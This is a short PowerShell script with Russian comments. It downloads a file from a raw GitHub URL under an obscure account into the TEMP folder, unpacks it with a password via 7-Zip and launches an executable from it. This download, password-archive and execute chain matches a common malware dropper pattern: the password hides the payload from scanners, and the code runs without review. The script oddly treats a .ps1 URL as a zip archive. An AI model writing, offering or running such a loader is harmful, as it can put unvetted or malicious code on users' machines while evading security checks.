# =============================================
# Скрипт для скачивания, распаковки с паролем и открытия файла
# =============================================

param(
    [string]$Url = "https://raw.githubusercontent.com/v25888656-maker/installer/main/hq.ps1",  # можно поменять
    [string]$DownloadPath = "$env:TEMP\downloaded_file.zip",
    [string]$Password = "",           # ← сюда вставь пароль от архива
    [string]$ExtractTo = "$env:TEMP\extracted",
    [string]$FileToOpen = ""          # имя файла внутри архива, который нужно открыть (например: "program.exe")
)

# Создаём папку для распаковки
if (!(Test-Path $ExtractTo)) {
    New-Item -ItemType Directory -Path $ExtractTo -Force | Out-Null
}

Write-Host "Скачиваем файл..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -UseBasicParsing
    Write-Host "Файл успешно скачан: $DownloadPath" -ForegroundColor Green
}
catch {
    Write-Host "Ошибка при скачивании: $_" -ForegroundColor Red
    exit 1
}

# Распаковка с паролем через 7-Zip (самый надёжный способ)
$7zipPath = "C:\Program Files\7-Zip\7z.exe"

if (!(Test-Path $7zipPath)) {
    Write-Host "7-Zip не найден! Установи 7-Zip или укажи правильный путь." -ForegroundColor Red
    exit 1
}

Write-Host "Распаковываем архив с паролем..." -ForegroundColor Cyan

$arguments = "x `"$DownloadPath`" -o`"$ExtractTo`" -p`"$Password`" -y"

$process = Start-Process -FilePath $7zipPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow

if ($process.ExitCode -eq 0) {
    Write-Host "Архив успешно распакован!" -ForegroundColor Green
} else {
    Write-Host "Ошибка распаковки. Возможно, неверный пароль." -ForegroundColor Red
    exit 1
}

# Если указан файл для открытия — открываем его
if ($FileToOpen) {
    $fullPath = Join-Path $ExtractTo $FileToOpen
    
    if (Test-Path $fullPath) {
        Write-Host "Открываем файл: $fullPath" -ForegroundColor Green
        Start-Process $fullPath
    } else {
        Write-Host "Файл $FileToOpen не найден в архиве!" -ForegroundColor Yellow
        # Открываем папку с распакованным содержимым
        explorer $ExtractTo
    }
} else {
    # Просто открываем папку
    explorer $ExtractTo
}

Write-Host "Готово!" -ForegroundColor Green